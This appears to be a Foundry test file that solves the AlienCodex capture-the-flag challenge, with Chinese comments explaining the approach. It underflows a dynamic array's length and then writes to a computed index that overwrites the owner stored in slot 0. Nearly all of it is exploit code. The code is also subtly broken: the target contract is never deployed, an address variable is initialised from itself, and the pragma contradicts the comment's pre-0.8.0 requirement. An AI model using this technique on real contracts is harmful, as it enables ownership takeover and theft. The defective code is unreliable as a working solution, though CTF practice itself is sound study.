pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/AlienCodex.sol";


/** 
 * 解题思路：利用 0.8.0 以前的算数溢出方式，将数组的长度设置为 2^256 - 1，然后找到 owner 的位置，设置成任意的 owner 就可以
 * 需要注意的点：
 * - 合约继承了 Ownable，就会有一个隐藏的 _owner 变量在 slot 0
 * - 这个漏洞只在 0.8.0 以前有用
 */
contract HackAlienCodexTest is Test {
    address hacker = address(hacker);
    AlienCodex public ac;

    function setUp() public {
        vm.deal(hacker, 1 ether);
    }
    function testHackAlienCodex() public {
        vm.startPrank(hacker);
        ac.makeContact();
        // 触发溢出攻击，将数组的长度调整为 2^256 -1
        ac.retract();

        // 找到 owner 的 Index
        uint index = uint256(2) ** uint256(256) - uint256(keccak256(abi.encode(uint256(1))));
        ac.revise(index, bytes32(uint256(uint160(msg.sender))));
        vm.stopPrank();
    }
}